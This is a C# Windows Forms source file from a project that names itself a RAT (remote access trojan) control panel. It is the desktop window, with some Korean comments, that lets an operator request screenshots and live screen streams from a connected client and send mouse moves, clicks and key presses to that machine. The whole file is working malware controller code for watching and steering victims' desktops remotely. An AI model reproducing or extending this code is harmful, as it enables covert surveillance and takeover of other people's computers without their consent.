using System;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using Newtonsoft.Json;
using RAT.Shared.Models;

namespace RAT.ControlPanel.Forms
{
    public partial class frmDesktop : Form
    {
        private ClientInfo client;
        private MainForm mainForm;
        private bool isStreaming = false;
        private int fpsCount = 0;
        private DateTime lastFpsTime;
        
        public frmDesktop(ClientInfo client, MainForm mainForm)
        {
            this.client = client;
            this.mainForm = mainForm;
            InitializeComponent();
            this.Text = $"Desktop - {client.ClientId}";
            lastFpsTime = DateTime.Now;
            
            // MainForm에 이 폼 등록
            mainForm.RegisterForm(client.ClientId, this);
        }
        
        private void frmDesktop_Load(object sender, EventArgs e)
        {
            timerFps.Start();
        }
        
        // ===== Screenshot =====
        
        private async void btnScreenshot_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "screenshot" });
        }
        
        // ===== Start/Stop Streaming =====
        
        private async void btnStart_Click(object sender, EventArgs e)
        {
            if (!isStreaming)
            {
                await SendCommand(new { type = "screen_stream", action = "start" });
                isStreaming = true;
                btnStart.Text = "Stop";
                btnStart.BackColor = Color.Red;
            }
            else
            {
                await SendCommand(new { type = "screen_stream", action = "stop" });
                isStreaming = false;
                btnStart.Text = "Start";
                btnStart.BackColor = SystemColors.Control;
            }
        }
        
        // ===== Mouse Control =====
        
        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            if (!chkMouseControl.Checked || !isStreaming) return;
            
            if (pictureBox1.Image == null) return;
            
            // 좌표 변환
            var img = pictureBox1.Image;
            var pbSize = pictureBox1.ClientSize;
            
            var wfactor = (double)img.Width / pbSize.Width;
            var hfactor = (double)img.Height / pbSize.Height;
            var resizeFactor = Math.Max(wfactor, hfactor);
            
            var imageSize = new Size((int)(img.Width / resizeFactor), (int)(img.Height / resizeFactor));
            
            double pbXMid = (double)pbSize.Width / 2;
            double pbYMid = (double)pbSize.Height / 2;
            
            double screenLB = pbXMid - imageSize.Width / 2;
            double screenRB = pbXMid + imageSize.Width / 2;
            double screenTB = pbYMid - imageSize.Height / 2;
            double screenBB = pbYMid + imageSize.Height / 2;
            
            if (e.Location.X < screenLB || e.Location.X > screenRB) return;
            if (e.Location.Y < screenTB || e.Location.Y > screenBB) return;
            
            var tgtWfactor = img.Width / (pbSize.Width - 2 * screenLB);
            var tgtHfactor = img.Height / (pbSize.Height - 2 * screenTB);
            
            double locX = (e.Location.X - screenLB) * tgtWfactor;
            double locY = (e.Location.Y - screenTB) * tgtHfactor;
            
            _ = SendCommand(new { type = "mouse_move", x = (int)locX, y = (int)locY });
        }
        
        private async void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            if (!chkMouseControl.Checked) return;
            
            await SendCommand(new { type = "mouse_click", button = e.Button.ToString() });
        }
        
        // ===== Keyboard Control =====
        
        private async void frmDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            if (!chkKeyboardControl.Checked) return;
            
            await SendCommand(new { type = "keyboard_press", key = (int)e.KeyCode });
        }
        
        // ===== FPS Timer =====
        
        private void timerFps_Tick(object sender, EventArgs e)
        {
            var now = DateTime.Now;
            var span = now - lastFpsTime;
            
            if (span.TotalSeconds >= 1)
            {
                lblFps.Text = $"{fpsCount} FPS";
                lblFps.ForeColor = fpsCount >= 10 ? Color.Green : Color.Red;
                fpsCount = 0;
                lastFpsTime = now;
            }
        }
        
        // ===== Save Screenshot =====
        
        private void btnSave_Click(object sender, EventArgs e)
        {
            if (pictureBox1.Image == null)
            {
                MessageBox.Show("No image to save", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "PNG Image|*.png|JPEG Image|*.jpg|Bitmap Image|*.bmp";
            sfd.FileName = $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}";
            
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                pictureBox1.Image.Save(sfd.FileName);
                MessageBox.Show("Screenshot saved successfully", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        
        // ===== 명령 전송 =====
        
        private async Task SendCommand(object command)
        {
            await mainForm.SendCommand(client, command);
        }
        
        // ===== 응답 처리 =====
        
        public void HandleResponse(dynamic response)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => HandleResponse(response)));
                return;
            }
            
            string type = response.type.ToString();
            
            if (type == "screenshot" || type == "screen_stream")
            {
                string base64Image = response.data.ToString();
                byte[] imageBytes = Convert.FromBase64String(base64Image);
                
                using (var ms = new System.IO.MemoryStream(imageBytes))
                {
                    pictureBox1.Image = Image.FromStream(ms);
                }
                
                fpsCount++;
            }
        }
        
        private void frmDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (isStreaming)
            {
                _ = SendCommand(new { type = "screen_stream", action = "stop" });
            }
        }
    }
}
